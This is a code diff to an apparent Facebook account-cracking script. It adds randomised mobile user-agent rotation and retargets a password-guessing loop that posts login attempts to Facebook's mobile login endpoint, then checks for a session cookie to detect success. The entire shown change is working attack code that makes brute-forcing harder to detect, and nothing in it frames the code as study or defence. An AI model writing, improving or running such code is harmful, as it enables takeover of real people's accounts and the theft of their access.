@@ -687,6 +687,20 @@ for okdk in range(5000):
     #print(f' {B}|{G}USERAGENT{B}|{P} {ua}');time.sleep(2);sifat()
     SUMONapi.append(ua)
 
+sum = []
+for xd in range(10000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['8.1.0','9','10','11','12','13'])
+    c='SM-G960N Build/QP1A.190711.020; wv)'
+    d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    e=random.randrange(73,100)
+    f='0'
+    g=random.randrange(4200,4900)
+    h=random.randrange(40,150)
+    i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
+    uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+    sum.append(uakuh)
+
 red = "\033[1;31m"
 green = "\033[1;32m"
 yellow = "\033[1;33m"
@@ -1790,7 +1804,7 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)
+            ua = random.choice(sum)
             pro = random.choice(SUMONua)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
@@ -1837,13 +1851,13 @@ def mbasic(uid,pwx,tl):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': ua,
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"
+            url = "https://m.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
